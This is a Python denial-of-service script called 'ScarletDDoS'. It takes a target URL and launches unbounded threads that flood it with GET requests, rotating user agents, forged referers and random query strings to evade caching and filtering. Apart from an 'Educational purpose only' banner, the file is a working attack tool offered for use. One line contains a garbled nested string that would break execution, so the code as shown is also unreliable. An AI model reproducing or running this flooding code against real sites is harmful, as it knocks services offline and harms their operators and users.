import os
import requests
import threading
import random

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input("URL:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
]


def useragent():
    global headers
    headers.append("headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")")
    headers.append("Mozilla/5.0 (Linux; Android 8.1.0; NOGAPAD101GHD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 8.1.0; NOGAPAD101GHD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Safari/537.36")
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
    headers.append("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.3.258 Yowser/2.5 Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 9; CPH1859) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36,gzip(gfe)")
    headers.append("Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 5 MIUI/V12.0.3.0.PEICNXM)")
    headers.append("Mozilla/5.0 (Linux; Android 9; M13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; arm_64; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaApp_Android/10.92 YaSearchBrowser/10.92 BroPP/1.0 SA/1 Mobile Safari/537.36")
    headers.append("Dalvik/2.1.0 (Linux; U; Android 9; RMX1945 Build/PPR1.180610.011)")
    headers.append("Mozilla/5.0 (Linux; Android 10; LM-Q730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36")
    headers.append("Dalvik/1.6.0 (Linux; U; Android 4.4.2; P709 Build/KOT49H)")
    headers.append("Mozilla/5.0 (Linux; Android 4.4.2; SMART Start Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7 Safari/605.1.15")
    
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0} ScarletDDoS Sent".format(count))
            except requests.exceptions.ConnectionError:
                print ("[Server might be down!]")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
